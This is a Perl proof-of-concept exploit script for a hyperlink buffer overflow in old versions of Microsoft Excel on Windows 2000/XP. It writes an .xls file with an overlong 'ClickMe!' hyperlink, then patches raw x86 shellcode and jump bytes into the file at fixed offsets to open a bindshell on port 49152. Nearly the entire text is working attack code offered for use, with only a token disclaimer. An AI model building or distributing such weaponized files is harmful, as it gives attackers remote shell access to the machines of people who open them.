#############################################################
# excel hlink overflow UNIVERSAL poc by SYS 49152           #
# public version                                            #
#                                                           # 
# works with ANY of the following oses/office combinations: #
# -windows 2k sp4/XP SP1/XP SP2                             #
#                                                           #
# -office 2000/Xp/2003                                      #
#                                                           #
# bindshell on port 49152                                   #
#                                                           #
# thanks go to BuzzDee for some things..                    #
#                                                           #  
# credits to kcope for finding the vuln..                   #
#                                                           #
# I'm always ready to join groups, boards and the like..    #
#                                                           #
# for anything about this sploit you can drop a mail to     #
#                                                           #
# gforce(AT)operamail.com                                   #
#############################################################
use Spreadsheet::WriteExcel;

my $workbook = Spreadsheet::WriteExcel->new("SYS_49152_universal_hlink.xls");
$worksheet = $workbook->add_worksheet();

$format = $workbook->add_format();
$format->set_bold();
$format->set_color('black');
$format->set_align('center');

$col=7;
$worksheet->write($row, $col, "excel overflow UNIVERSAL poc by SYS 49152 public version",$format);
$row = 2;   
$worksheet->write($row, $col, "bindshell on port 49152", $format);
$row = 6 ;
$worksheet->write($row, $col, "I'm always ready to join groups, boards and the like.. but skiddiefree..", $format);
$row = 7;
$worksheet->write($row, $col, "gforce(AT)operamail.com", $format);
$row = 9;   
$worksheet->write($row, $col, "thanks go to BuzzDee for some things..", $format);
$row = 11 ;  
$worksheet->write($row, $col, "credits to kcope for finding the vuln..", $format);
$row = 16  ;
$worksheet->write($row, $col, "DISCLAIMER: you are NOT allowed by me to use this poc for any kind of illegal activities..", $format);


$a="aaaaaaaaa\x53\x59\x53\x34\x39\x31\x35\x32\x52\x55\x4C\x45\x5Aaaaaaaaaa\\" x 80;


my $shellcode = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45".
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49".
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d".
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66".
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61".
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40".
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32".
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6".
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09".
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0".
"\x66\x68\xc0\x00\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff".
"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53".
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff".
"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64".
"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89".
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab".
"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51".
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53".
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6".
"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0";
 



$worksheet->write_url(0, 0, "$a", "ClickMe!");
$workbook->close();

open(ass, "+<SYS_49152_universal_hlink.xls") || die "Can't Open temporary File\n";
seek ass,6854,0;
print ass $shellcode;
seek ass,7233,0;
print ass "\xEB\xF4\x90\x90\x13\xAC\x8D\x30";
seek ass,7223,0;
print ass "\xE9\x8A\xFE\xFF\xFF";
seek ass,6449,0;
print ass "\xEB\x1A\x90\x90\x10\x14\xB3\x30";
seek ass,6477,0;
print ass "\xEB\x7e\x90\x90\xB4\x9B\xCB\x30";
seek ass,6605,0;
print ass "\xEB\x7e";
seek ass,6733,0;
print ass "\xEB\x77";
print ".xls file written correctly.\n";
close (ass);
